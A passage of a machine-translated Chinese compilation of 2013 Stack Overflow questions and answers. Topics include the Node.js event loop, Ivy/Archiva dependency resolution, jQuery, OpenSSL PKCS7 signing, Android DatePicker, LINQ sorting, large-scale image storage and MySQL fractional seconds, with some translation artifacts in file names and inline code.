1.  是的，直到节点 0.6，在 0.8 中已弃用并使用线程池
2.  是的，但`libev`不使用线程池。看[这里](http://nodejs.org/oscon.pdf)

    澄清：根据我发布的[问题中的](https://stackoverflow.com/questions/10680601/nodejs-event-loop)[链接](http://pod.tst.eu/http://cvs.schmorp.de/libeio/eio.pod)，确实支持处理 I/O（包括套接字）的所有 POSIX 函数。但是节点作者决定仅将其用于异步文件 I/O，并用于网络 I/O。我不知道你是从哪里听说的，但你可以在常规文件上使用 epoll。`libeio``libev`

3.  `libev`使用事件循环，所以这里没有问题。

4.  是的[IOCP](http://msdn.microsoft.com/en-us/library/aa365198%28VS.85%29.aspx)在 Windows 中处理异步 I/O，内核确实使用线程池。
5.  新的 linux 内核在新的 BSD 内核中有 epoll、kqueue。`libev`并且`libeio`适用于 linux 环境，并为所有内核提供事件循环/异步 IO（支持 select、poll、epoll、kqueue）。

更新问题：

1.  不太了解`libuv`
2.  也许够了（不知道）
3.  这是我在 Windows 8 上的发现，通过 Process Explorer 进行了检查。显示节点应用程序进程的 4 个线程、1 个 DLL、1 个文件和 1 个部分（共 7 个条目）。

4.  `ps -eLf`确实显示了所有线程和进程，也许你正在过度过滤它，只需查找节点进程 pid `ps -eLf | grep x`，就像 x 是节点进程的 pid 一样。

# ivy - 将 Archiva 存储库添加到 Ivy

> ID：15526549
> 
> 赞同：4
> 
> 时间：2013-03-20T14:36:15.010
> 
> 标签：ivy, archiva

我正在尝试向常春藤添加档案库，但它不起作用。

以下是使用的文件：

*常春藤.xml*

```
<ivy-module version="2.0"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:noNamespaceSchemaLocation="http://ant.apache.org/ivy/schemas/ivy.xsd">
<info organisation="in.ex" module="ivy-example" status="integration">
</info>
<dependencies>
    <dependency org="commons-lang" name="commons-lang" rev="2.6" />
</dependencies>
</ivy-module> 
```

*常春藤设置.xml*

```
<?xml version="1.0" encoding="UTF-8"?>
<ivysettings>
<settings defaultResolver="archiva" />
<credentials host="http://myarchiva/archiva/" realm="Apache Archiva"
    username="user" passwd="pwd" />
<property name="archiva-internal"
    value="http://myarchiva/archiva/repository/internal" />
<resolvers>
    <ibiblio name="archiva" m2compatible="true" root="${archiva-internal}" />
</resolvers>
</ivysettings> 
```

*构建.xml*

```
<project name="ivy example" default="resolve" xmlns:ivy="antlib:org.apache.ivy.ant">

<target name="resolve" description="resolve dependencies with ivy">
    <ivy:settings file="ivysettings.xml" />
    <ivy:retrieve />
</target>

</project> 
```

当我运行 ant 任务时，显示以下错误：

```
module not found: commons-lang#commons-lang;2.6
==== archiva: tried
http://myarchiva/archiva/repository/internal/commons-lang/commons-lang/2.6/commons-lang-2.6.pom
-- artifact commons-lang#commons-lang;2.6!commons-lang.jar:
http://myarchiva/archiva/repository/internal/commons-lang/commons-lang/2.6/commons-lang-2.6.jar 
```

似乎没有找到 commons-lang 但它仍然存在。当我在浏览器中尝试 url 时，我得到了 jar。

有人能帮帮我吗？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-08-11T10:26:41.327

当我运行 ant -d 时，我看到了一个错误

```
[ivy:retrieve] CLIENT ERROR: Unauthorized url=http:// 
```

我花了很长时间才弄清楚为什么我不能从我当地的 Archiva 那里得到文物。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-04T20:55:35.573

您拥有的唯一解析器是您的内部存储库。并且您的存储库中没有 commons-lang-2.6.jar。解决此问题的最简单方法是添加默认的 Maven 存储库。在您自己的解析器之后解析器

```
 <ibiblio name="central" m2compatible="true" /> 
```

或者您也可以下载并手动添加文件。

更新：realm 的值也应该如下，并且区分大小写

```
 "Repository Archiva Managed internal Repository" 
```

# c++ - Visual Studio 2012 平台：只有 ARM 和 Win32？

> ID：15526552
> 
> 赞同：2
> 
> 时间：2013-03-20T14:36:18.767
> 
> 标签：c++, visual-studio-2012

我尝试在 XP 32 位计算机上运行 .exe。我在 Windows 7 64 位上使用 Visual Studio 2012。

我收到一条消息“**.exe 不是有效的 win32 应用程序。

所以，这是因为我已经用 64 位编译了程序。

我尝试在我的项目属性中更改平台目标，但我只有“Win32、ARM 和 x64”

Win32 = x86？

为什么我没有x86平台就行了？

截图：

![在此处输入图像描述](../Images/f5e09755fa7e581253684a1d86a3444f.png)

我很抱歉我的英语不好...

先感谢您。

编辑：好的，Win32 == x86，那么为什么当我在 Win32 中编译时，我收到消息“**.exe 不是有效的 win32 应用程序”。在 32 位赢 XP 上？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:40:32.207

x86 用于 Intel 或 AMD 特定代码生成，而 Win32 是通用 32 位目标。参考：[http](http://en.wikipedia.org/wiki/Win32) ://en.wikipedia.org/wiki/Win32 ，[智能卡项目中 WIN32 和 x86 的区别](https://stackoverflow.com/questions/7709942/difference-between-win32-and-x86-in-smart-card-project)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:39:27.410

`Win32`在 Visual Studio中调用 32 位 Windows 平台。所以是的，x86 == Win32。

# jquery - 在 ajax 回调中使用变量“状态”

> ID：15526560
> 
> 赞同：0
> 
> 时间：2013-03-20T14:36:39.747
> 
> 标签：jquery, ajax, json

我正在使用带有 jquery 的 ajax 请求发出一个奇怪的行为，在 header 下面的代码中。无法在名为“status”的变量中检索到它似乎可以与另一个变量名一起正常工作，我想知道为什么 ？

```
$.ajax({ 
     type: "GET", 
     url: myConnect.prototype.URL, 
     data: params, 
     error: this.errorHandler,
     success: function(data){ 
          response = JSON.parse(data);

          status = response.STATUS;
          if(status.SUCCESS){ //never true since status is not an object.
               console.log('success !');
          }
     }
}); 
```

数据是：`{"STATUS":{"SUCCESS":1,"DESCRIPTION":""}}`

状态变量设置为字符串，我可以在 chrome 的 Watch Expression 视图中看到它的值：

```
status: "[object Object]" 
```

但是，如果我将此变量称为“t”（或其他任何内容），则条件将为真，并且将记录“*成功！*'

有什么解释吗？

编辑：由 chrome 显示的响应解析对象：

```
 response : Object
      STATUS: Object
           DESCRIPTION: ""
           SUCCESS: true
      _proto_: Object
 _proto_: Object 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:51:06.603

如果您将状态设为本地，它应该可以工作

```
$.ajax({ 
     type: "GET", 
     url: WellcomsConnect.prototype.URL, 
     data: params, 
     error: this.errorHandler,
     success: function(dara){ 
          response = JSON.parse(data);

          var status = response.STATUS; // make it local
          if(status.SUCCESS){ //never true since status is not an object.
               console.log('success !');
          }
     }
}); 
```

**编辑：**

下面的解释实际上仅适用于 Chrome - Firefox 工作正常 - IE9 不起作用

它不是的原因是因为[`window`已经有一个 status 属性](https://developer.mozilla.org/en-US/docs/DOM/window.status)，并且您的 Status 对象被存储为一个字符串 -`[object Object]`而不是一个对象

![在此处输入图像描述](../Images/33b045aeb916af8553aa762c2a3415b3.png)

我在 IE9/Firefox/Chrome 中测试了这个

[仅适用于 Firefox](http://jsfiddle.net/UKGP3/) - 使用全局

然后

[全面工作](http://jsfiddle.net/3wByp/)- 使用本地

# jquery - 使用 requirejs 2.1.5 和 google cdn

> ID：15526567
> 
> 赞同：0
> 
> 时间：2013-03-20T14:37:01.743
> 
> 标签：jquery, requirejs, google-cdn

我刚开始使用 requirejs api，但有一个关于使用 google CDN 的初步问题。

目前，要获取最新的 jquery 和 jqueryui，我使用以下内容：

```
<meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
<script src="https://www.google.com/jsapi?key=myKey"></script> 
<script type="text/javascript">
//=== Load in any web modules necessary
    google.load("jquery", "1");
    google.load("jqueryui", "1");
</script> 
```

是否可以在 requirejs 中使用这种结构或类似的结构？如果是这样，main.js 文件会是什么样子？

另外，requirejs 也可以控制 css 包含吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-21T13:40:35.690

radi8，据我所知（我可能弄错了）RequireJS 仅对处理 JS 依赖项有用。在 CSS 中你可以使用@import，但你需要提供一个硬编码的 URL。如果您想要更强大的 CSS 处理，我建议您研究 Less 或 Sass。

更新：实际上，我一直在阅读和使用 RequireJS 并从[API 使用页面](http://requirejs.org/docs/api.html#usage)找到了这个美味的花絮：

```
define(["require"], function(require) {
   var cssUrl = require.toUrl("./style.css");
}); 
```

显然，摆弄这个是值得的，看看它是否适合你的用例等等。希望这会有所帮助。

# openssl - PKCS7_Sign 不签名

> ID：15526568
> 
> 赞同：0
> 
> 时间：2013-03-20T14:37:02.950
> 
> 标签：openssl, sign, pkcs#7

这是代码的一部分：

```
flags = 0;
flags |= PKCS7_BINARY;
flags |= PKCS7_NOATTR;
pkcs7 = PKCS7_sign( cert, pkey, NULL, bio_data, flags );
if ( !pkcs7 )
    return;

iErr = i2d_PKCS7_bio( bio_out_der, pkcs7 );
if ( iErr != 1 )
    return; 
```

运行时没有错误，但我不明白为什么输出数据不包含符号。输出数据是正确的 PKCS7 signedData 结构，但它已经准备好唱歌数据而不是签名本身。这是输出 PKCS7 结构末尾的数据示例：

```
04400001FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF003021300906052B0E03021A0500041440BD001563085FC35165329EA1FF5C5ECBDBBEEF 
```

即这是SHA1的OID，要签名的数据的SHA1，填充，即必须用私钥签名的数据。为什么不执行签名？

# silverlight - 互联网上的 Silverlight 完全信任的浏览器内应用程序可以工作吗？

> ID：15526570
> 
> 赞同：2
> 
> 时间：2013-03-20T14:37:07.903
> 
> 标签：silverlight, out-of-browser, full-trust

我正在开发一个 Silverlight 应用程序，它需要以更高的信任度运行，因为它的作用和工作方式。

我已正式从 COMODO 获得证书并使用此证书签署申请。接下来，在 Visual Web Developer 中，我已将 Silverlight 应用程序配置为在“浏览器外”运行，并且一切正常，即该应用程序是“受信任的”并且在我测试时执行它应该做的事情。

但是...我非常希望将此应用程序嵌入我网站的一个页面中，即我希望它作为提升信任的“浏览器内”应用程序运行，例如当单击某个页面上的“运行”按钮时。

为此，（根据 MSDN 等人的说法）我必须修改我的“目标”机器的注册表项，这意味着我必须更新几个 HKEY_LOCAL_MACHINE 条目，我可以这样做，但我的问题是： -

如果我的“目标”机器与我托管网站的机器相同，那么会发生什么 Internet 上浏览我网站的人单击“运行”按钮？我的“浏览器中”应用程序是否会为他们失败（因为不是“受信任”），或者 Silverlight 运行时是否会使用目标机器（即我的主机）中的 HKEY_LOCAL_MACHINE 条目并将“浏览器中”提升的信任授予浏览我页面的人?

我可以看到这在 Intranet 上是如何工作的，但是我找不到任何描述 Internet 上会发生什么的地方。

提前感谢您的任何建议或帮助

理查德

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T23:37:23.637

在网上搜索后在这里回答了我自己的问题：

“首先要了解的一点是，这个功能显然不适用于随机互联网应用程序。它需要签名的 XAP、本地安装的证书和要设置的某个注册表项，例如可以通过组策略进行管理。这使得它很难用于像企业这样的封闭环境之外的应用程序。

所以看来我的问题应该是'运行'浏览器外'完全信任Silverlight 5应用程序和'浏览器内'完全信任Silverlight 5应用程序之间有什么区别（除了显而易见的）？我可以将“浏览器外”完全信任应用程序链接到我的网页，但为什么不直接从我的网页使用“浏览器内”完全信任应用程序呢？还是我错过了什么？

# java - 无法分配超过 1397mb 的 JVM 堆

> ID：15526571
> 
> 赞同：2
> 
> 时间：2013-03-20T14:37:08.160
> 
> 标签：java, jvm, command-line-arguments, jvm-arguments

如果我尝试使用 -Xmx1397m 命令行参数运行超过 1397mb 的 Java，则无法初始化。为什么是这样？

IE：

*   “ `java path\java.exe" -Xmx1397m` -> 作品

*   `java path\java.exe" -Xmx1398m`-> 崩溃

这台机器几乎有 100GB 未使用的内存，我正在运行 32 位 java

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:39:14.827

这是 Windows 上 32 位 java 的一个已知问题，由于地址空间碎片问题，您无法获得预期的 3 GB 堆。HotSpot JVM 的堆需要一个*连续的*地址块，并且一些永久映射到用户空间的共享 DLL 正在对空间进行分段。

# ios - Paypal 移动支付 - 使用 Phonegap HTML5 IOS 应用程序

> ID：15526573
> 
> 赞同：1
> 
> 时间：2013-03-20T14:37:10.043
> 
> 标签：ios, html, cordova, paypal

有没有人成功设置将在 Phonegap IOS 应用程序中运行的 Paypal 支付？

我们的简介是允许客户通过 CMS 在应用程序内设置付款。

我目前的方法是填充一个标准的购买按钮表单，该表单通过 json 加载到应用程序中 - 当用户进行预订时触发 - 他们将在应用程序外部发送到在 Safari 中运行的 Paypal 页面 - 当支付完成时 Paypal将重定向到一个安全的服务器页面 - 它将从贝宝接收交易 ID - 解密这个（通过贝宝提供的代码）以接收付款信息 - 将相关交易数据存储在数据库中，然后触发应用程序重新打开理想情况下触发应用程序内的一个函数，该函数将根据从 CMS 接收到的数据刷新订单。

听起来很复杂 - 但由于在应用程序中打开贝宝表单的限制 - 以及我们需要为广泛的用户即时制作购买按钮的事实 - 这是我能想到的最好的。

有没有人有更好的建议/尝试和测试的解决方案！？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T00:26:19.490

现在，我正在尝试找出在 iOS 上的 PhoneGap 支付方面提供最佳体验的方法...

![在此处输入图像描述](../Images/8f60dc0587dde15f451fcd4a1f5f647b.png)

说到 PayPal：刚刚尝试了他们的工作流程，我必须承认它与一个开箱即用的工作非常好，但是：返回 URL 将我带到了一个外部站点，所有这些都包含 Cordova 应用程序的上下文。*（它可能通过[覆盖默认 url](https://stackoverflow.com/questions/5537020/paypal-button-adding-variable-to-return-url)[到本地应用程序来](http://iosdevelopertips.com/cocoa/launching-your-own-application-via-a-custom-url-scheme.html)修复，这[在此处检测到](https://stackoverflow.com/questions/1108693/is-it-possible-to-register-a-httpdomain-based-url-scheme-for-iphone-apps-like/1109200#1109200)，或者可能使用[InAppBrowser](http://cordova.apache.org/docs/en/2.5.0/cordova_inappbrowser_inappbrowser.md.html)）*

> 付款完成后，Paypal 将重定向到一个安全的服务器页面 - 该页面将从 paypal 接收交易 ID

请看区别：

*   [https://www.paypal.com/pdt](https://www.paypal.com/pdt) - 支付数据传输 - 不能依赖，用户可以关闭浏览器（在这种特殊情况下关闭应用程序）
*   [https://www.paypal.com/ipn](https://www.paypal.com/ipn) - 即时付款通知 - 自动发送到您的后端，更好地指示付款是否已完成

*（如果它们相关，我将在这方面进行更多尝试并分享发现）*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T02:05:16.130

[如果你对一些 Objective-C 感到满意，你可以试试新的PayPal iOS SDK](https://github.com/paypal/PayPal-iOS-SDK/)的 PhoneGap 插件。您可以将[card.io PhoneGap 插件](https://github.com/phonegap/phonegap-plugins/tree/master/iOS/card.io)视为模型。

# java - 通过Jsoup登录是否保存？

> ID：15526575
> 
> 赞同：1
> 
> 时间：2013-03-20T14:37:16.070
> 
> 标签：java, security, https, save, jsoup

您好，我有一个使用 Jsoup 用 Ja​​va 编写的程序，可以让我登录到特定的网站。我想知道的是它是否保存？当我使用浏览器时，协议是https。

[http://oi47.tinypic.com/aysp4m.jpg](http://oi47.tinypic.com/aysp4m.jpg)

那么如果我使用我的程序是保存还是有人可以窃取我的密码？

```
 res2 = Jsoup
                .connect("https://bannersbroker.com//user/login?event=doLogin")
                .header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.52 Safari/537.17")
                .cookies(res.cookies())
                .data("email", email)
                .data("pass", pass)
                .data(name[0], value[0])
                .data(name[1], value[1])
                .data(name[2], value[2])
                .method(Connection.Method.POST)
                .execute(); 
```

如果它不保存如何保护它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T15:48:20.487

这应该与*https*一样保存。但是您必须确保没有人可以从您的程序中窃取您的密码（访问您的`pass`变量、反编译代码、读取您的存储文件等）

要确保*https*正常工作，您可以使用[Wireshark](http://www.wireshark.org/)。跟踪程序的网络活动并查看您的数据是否已加密。

# javascript - javascript函数，如果输入改变

> ID：15526580
> 
> 赞同：0
> 
> 时间：2013-03-20T14:37:28.697
> 
> 标签：javascript, function, select, option, onchange

我今天对此进行了编码，但是当我使用下拉列表时，我无法正常工作……当我自己编写数字时，它可以正常工作。为什么？！

```
 function favBrowser() {
    var mylist=document.getElementById('myList');
    document.getElementById('favorite').value=mylist.value;
}
 function bar() {
document.write('Hello World!');

<select id="myList" onchange="favBrowser()">
    <option></option>
    <option value="a">a</option>
    <option value="b">b</option>  
    <option value="c">c</option>
    <option value="d">d</option>
    <option value="e">e</option>
</select>
<p>heheheh: <input type="text" id="favorite" size="20" oninput="return bar()" onValueChanged="return bar()" value=""></p> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:43:07.240

我想这就是你要找的

```
function favBrowser(list) {
    document.getElementById('favorite').value=list.value;
}

<select id="myList" onchange="favBrowser(this)">
    <option></option>
    <option value="a">a</option>
    <option value="b">b</option>  
    <option value="c">c</option>
    <option value="d">d</option>
    <option value="e">e</option>
</select>
<p>heheheh: <input type="text" id="favorite" size="20" value=""></p> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:40:42.923

select 元素没有值，其中的 option 元素有值。请尝试以下操作：

```
document.getElementById('favorite').value=mylist.options[myList.selectedIndex].value; 
```

未经测试，但这就是想法

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:49:52.097

有这个代码html代码：

```
<select id="myList" onchange="favBrowser(this.value)">
    <option></option>
    <option value="a">a</option>
    <option value="b">b</option>  
    <option value="c">c</option>
    <option value="d">d</option>
    <option value="e">e</option>
</select>

<input type="text" id="favorite" size="20" value=""/> 
```

您可以执行以下操作：

```
function favBrowser(val) {
     document.getElementById('favorite').value=val;
} 
```

每次更改下拉列表的值时，都会自动更改输入的值，因为您将下拉列表的值作为参数发送。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T15:00:10.243

首先，没有事件`onValueChanged`；你正在寻找`onchange`。

之所以`bar()`在你的下拉脚本改变的值时不被触发`favorite`是因为`oninput`通过用户界面（不是脚本）改变元素的值时`onchange`触发，在发生时触发`blur`（即`input`元素失去焦点）。因此，为了获得您想要的结果，您需要调用`bar()`from `favBrowser()`：

```
function favBrowser() {
  var mylist=document.getElementById('myList');
  document.getElementById('favorite').value=mylist.value;
  bar();
} 
```

# android - android 4.1 和 4.2 中的 DatePicker 问题

> ID：15526592
> 
> 赞同：2
> 
> 时间：2013-03-20T14:38:02.053
> 
> 标签：android, android-layout, android-widget, datepicker, android-datepicker

我正在为所有版本（版本 2.2 到 4.2）开发一个 android 应用程序。我在其中使用 datePicker 并使用以下代码将所选日期的颜色更改为白色：

```
if (currentapiVersion >= 14) {

    ViewGroup dayChildpicker = (ViewGroup) datePicker
            .findViewById (Resources.getSystem().getIdentifier("day", "id", "android"));
    ViewGroup monthChildpicker = (ViewGroup) datePicker
            .findViewById(Resources.getSystem().getIdentifier("month", "id", "android"));
    ViewGroup yearChildpicker = (ViewGroup) datePicker
            .findViewById(Resources.getSystem().getIdentifier("year", "id", "android"));

    EditText dayET = null;
    EditText mornthET = null;
    EditText yearET = null;

    dayET = (EditText) dayChildpicker.getChildAt(1);
    mornthET = (EditText) monthChildpicker.getChildAt(1);
    yearET = (EditText) yearChildpicker.getChildAt(1);

    dayET.setTextColor(Color.WHITE); // null pointer error on this line
    mornthET.setTextColor(Color.WHITE);
    yearET.setTextColor(Color.WHITE);
} 
```

但这会在 android 4.1 和 4.2(Jelly beans) 中抛出空指针异常

```
dayET.setTextColor(Color.WHITE); 
```

在果冻豆中，我没有在 datepicker 中获得编辑文本视图。

在 jellybeans 中获取日期选择器的子项的方法是什么，以及如何在日期选择器中更改所选日期的文本颜色。

请指导我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T15:43:00.883

我不确定是否`getChildAt(1)`真的获得了控件，因为可能无法保证控件在`ViewGroup`. 但是，您应该能够通过标识符以不同方式引用它们

改变这些

```
dayET = (EditText) dayChildpicker.getChildAt(1);
mornthET = (EditText) monthChildpicker.getChildAt(1);
yearET = (EditText) yearChildpicker.getChildAt(1); 
```

对这些

```
dayET = (EditText) dayChildpicker.findViewById(Resources.getSystem().getIdentifier("numberpicker_input", "id",  "android"));
mornthET = (EditText) monthChildpicker.findViewById(Resources.getSystem().getIdentifier("numberpicker_input", "id",  "android"));
yearET = (EditText) yearChildpicker.findViewById(Resources.getSystem().getIdentifier("numberpicker_input", "id",  "android")); 
```

这应该允许您正确引用它们而不会出现空指针错误。

如果您有其他问题或者它不起作用，请告诉我。

# c# - LINQ 数字排序替换非数字字符

> ID：15526593
> 
> 赞同：0
> 
> 时间：2013-03-20T14:38:02.737
> 
> 标签：c#, sql, linq

我有以下 LINQ 查询：-

```
(from a in MyData
where a.Field1.Replace(" ","").Contains("ABCDEFG")
select a.Field2).Take(50) 
```

它返回：-

```
114                                
115                                
115 A                              
116                                
116 A                              
118                                
119                                
122                                
124                                
128                                
131                                
132                                
133                                
95                                 
96                                 
97                                 
98                                 
99 
```

我需要能够对这个列表进行数字排序，我可以这样做：-

```
(from a in MyData
where a.Field1.Replace(" ","").Contains("ABCDEFG")
select a.Field2).Take(50).OrderBy(x => Convert.ToInt32(x)) 
```

问题是这会返回：-

```
Conversion failed when converting the nvarchar value '111 A ' to data type int. 
```

因为它显然无法将 转换`'111 A '`为整数。

有没有什么方法可以去除所有非数字字符只是为了排序？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:41:58.687

尝试：

```
MyData.Where(d => Field1.Replace(" ","").Contains("ABCDEFG"))
    .AsEnumerable()
    .OrderBy(d => Convert.ToInt32(Regex.Split(d.Field2, @"\D+")[0]))
    .Take(50)
    .Select(d => d.Field2); 
```

您可以根据您想要的结果交换 OrderBy() 和 Take()。然而，正如 Bob Vale 所指出的：

> 如果 Take() 是第一个，那么它应该在 AsEnumerable() 之前

这样您就不会从源中加载所有记录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:42:15.697

不是最漂亮的代码，但在您的排序 lambda 中，您可以创建一个仅由数字组成的新字符串，然后将其转换为您的排序值的整数。

```
.OrderBy(x => 
    Convert.ToInt32(new string(x.Where(c => char.IsDigit(c))
                                .ToArray()
                              )
                   )
        ); 
```

# mongodb - 如何存储和服务 40 亿张图片？

> ID：15526594
> 
> 赞同：-4
> 
> 时间：2013-03-20T14:38:06.000
> 
> 标签：mongodb, cassandra, cloud

我想建立自己的网页缩略图云服务供我私人使用。我计划拥有超过 4,000,000,000 个小图像 (10KB) 我不想使用像 amazon S3 这样的外部服务，我想构建自己的云。

你将如何存储它并保持它的可扩展性？例如，在 cassandra 分布式数据库或 GlusterFS 文件系统上...

您将如何通过 HTTP 有效地提供服务？例如，对许多读取 cassandra 数据库的 http 服务器使用 nginx 负载均衡器...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:47:21.510

您的问题含糊不清，没有经过充分研究和形成，但是我会在这里提出一些建议。

> thumb-shots 云服务供我私人使用。

如果这是供您个人使用，我强烈建议您根本不使用数据库，而是使用高 IOPs SSD 支持的集群（服务器集）上的文件系统，专门针对高网络利用率和 IO 读取进行调整。

注意：这将很快扩展到比 S3 等外部服务更昂贵的方式。

> 您将如何安全地存储它（它需要 40TB）？

这有点宽泛，听起来缺乏任何真正的研究，但您可以从 Web 应用程序端保护它，并将规则放入图像服务器防火墙中，声明只允许 Web 应用程序访问图像。然后在您的网络应用程序中，您将有规则来保护您的图像使用。

> 您将如何通过 HTTP 有效地提供服务？

通过缓存机制，无论是在服务器上（在 Web 应用程序中）以 Varnish 的形式还是在浏览器中，都可以通过添加无限过期时间（可能）。

当然，“最佳”缓存机制取决于 Web 服务器和使用情况，即 Nginx 或 Apache。

这是一个模糊且过于宽泛的问题的基本答案。我强烈建议您进行一些研究，并通过您希望使用的任何服务器来研究图像服务。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:45:26.250

好吧，最大的问题是找到这样容量的存储，但即使你会找到，我认为任何普通的数据库都不能处理这么多的数据，所以你需要编写一些自定义的解决方案来存储/阅读。无论如何，如果你能描述你最初的问题，可能还有其他一些真正的解决方案，而不需要存储这么多图像，因为处理 40 亿张图像是不切实际的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T15:16:55.230

听起来像这样可能很有趣： [http ://docs.basho.com/riakcs/latest/](http://docs.basho.com/riakcs/latest/)

它刚刚开源，专门为构建您自己的 S3 而设计

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-21T17:34:03.017

OpenStack Swift 是一个对象存储项目，Rackspace 和 Wikimedia 都使用它来存储数百万张图像。

[http://docs.openstack.org/developer/swift/](http://docs.openstack.org/developer/swift/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-20T18:11:50.110

我认为您应该使用 blob（二进制大对象）。您考虑过 Google App Engine 的 blobstore 吗？如果您不熟悉 BLOB，那么这是开始使用云计算和图像服务的一种既好又便宜的方式。你可以用 python、java 或谷歌的新编译语言 go 对你的 blobhandling 进行编程。如果您使用 GAE，您还可以使用应用程序完成所有操作，而不必担心硬盘驱动器或操作系统。如果您想创建自己的堆栈，您应该查看您的服务提供商支持哪种集群。

# mysql - 如何从 MySQL 当前时间检索微秒或毫秒？

> ID：15526597
> 
> 赞同：12
> 
> 时间：2013-03-20T14:38:10.160
> 
> 标签：mysql, datetime, milliseconds

我正在尝试在 MySQL 上创建我的第一个存储函数。在这个函数中，我想用 3 微秒数字返回当前日期和时间的时间戳，如下所示：`YYYYMMDDHHMMSSZZZ`

我在我的数据库中使用这个数字来为我的离线记录创建唯一键，这样当我的系统合并来自不同离线服务器的数据库时，它们就不会崩溃。

所以我的第一次尝试是`SELECT CAST(MICROSECOND(NOW()) AS CHAR(3));`

但它返回 0。

如果我尝试`SELECT CAST(MICROSECOND('2009-12-31 23:59:59.001210') AS CHAR(3));`

根据我的需要，它返回 121。

**那么，如何告诉 MySQL 我想知道当前时间的微秒？**

* * *

编辑：

考虑一下：

```
CREATE FUNCTION CHAVE (pTable VARCHAR(32)) RETURNS CHAR(20)
BEGIN
    DECLARE vSigla CHAR(3);
    DECLARE vDateTime CHAR(14);
    DECLARE vMilli CHAR(3);
    DECLARE vKey CHAR(20);
    SET vSigla = (SELECT SIGLA FROM TABLELIST WHERE NOME = pTable);
    SET vDateTime = (SELECT CAST(LEFT(UTC_TIMESTAMP()+0, 14) AS CHAR(14)));
    SET vMilli = LPAD(FLOOR(RAND() * 1000), 3, '0');
    SET vKey = CONCAT(vSigla, vDateTime, vMilli);
    RETURN vKey;
END; 
```

的结果：

```
INSERT INTO TABLEX (dateID, name) VALUES (CHAVE('TABLEX'), 'EASI'); 
```

将是，来自 CHAVE('TABLEX')：

```
KEY20130320151159666 
```

其中 666 将是一个随机数，**但我希望它是当前时间的真正毫秒数**，所以我没有可能的重复密钥。

* * *

如果我可以使用`SHOW COLUMNS FROM @TableName WHERE FIELD_NAME LIKE '%_ID' LIMIT 1`并将其插入非动态 SELECT 以获取该表最后一条记录的毫秒数...

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2013-04-16T08:22:00.537

MySQL 5.6 支持[`sysdate`](http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_sysdate)函数中的毫秒精度。

尝试

`select sysdate(6)`将返回`2013-04-16 13:47:56.273434`

和

`select sysdate(3)`将返回`2013-04-16 13:47:56.273`

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-20T14:41:56.140

看看 MySQL 是怎么说的（[http://dev.mysql.com/doc/refman/5.1/en/fractional-seconds.html](http://dev.mysql.com/doc/refman/5.1/en/fractional-seconds.html)）：

`However, when MySQL stores a value into a column of any temporal data type, it discards any fractional part and does not store it.`

因此，您需要将其存储为一个简单的浮点值而不是日期值。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-11-10T09:36:11.377

对于 mysql 5.6

```
round(unix_timestamp() * 1000  + MICROSECOND(sysdate(6)) / 1000) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-12-10T03:50:42.737

你也可以

```
mysql> select now(3) as millisecond, now(6) as microsecond, round(1000 * unix_timestamp(now(3))) elapsed_millisecond, round(unix_timestamp() * 1000  + MICROSECOND(now(6)) / 1000) elapsed_microsecond;
+-------------------------+----------------------------+---------------------+---------------------+
| millisecond             | microsecond                | elapsed_millisecond | elapsed_microsecond |
+-------------------------+----------------------------+---------------------+---------------------+
| 2019-12-10 11:49:43.568 | 2019-12-10 11:49:43.568767 |       1575949783568 |       1575949783569 |
+-------------------------+----------------------------+---------------------+---------------------+
1 row in set (0.01 sec) 
```

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2018-09-12T14:46:22.617

这是我的毫秒管理解决方案。

我只是使用“文本”数据类型作为数据存储，因为您必须自己控制数据验证。

创建表 `time_test`（ `id`INT NOT NULL AUTO_INCREMENT， `start_time`TEXT NULL， `stop_time`TEXT NULL， `difference`TEXT NULL， `ranking`INT NULL，PRIMARY KEY ( `id`)）

插入`time_test`值（NULL，'10：10：10.111111'，'10：10：10.456789'，NULL，NULL） 插入`time_test`值（NULL，'10：10：10.111111'，'10：10：20.777777'，NULL， NULL）插入`time_test`值（NULL，'10：10：10.111111'，'10：10：01.999999'，NULL，NULL）

[现在你可以像这样计算](https://i.stack.imgur.com/6QPAC.jpg) 现在你可以像这样计算排序SELECT * FROM `time_test`ORDER BY TIME(stop_time)

计算时间差异，对我来说非常好。SELECT *, TIMEDIFF(stop_time,start_time) from`time_test`
[计算时间差异，对我来说非常好。](https://i.stack.imgur.com/6wt4b.jpg)

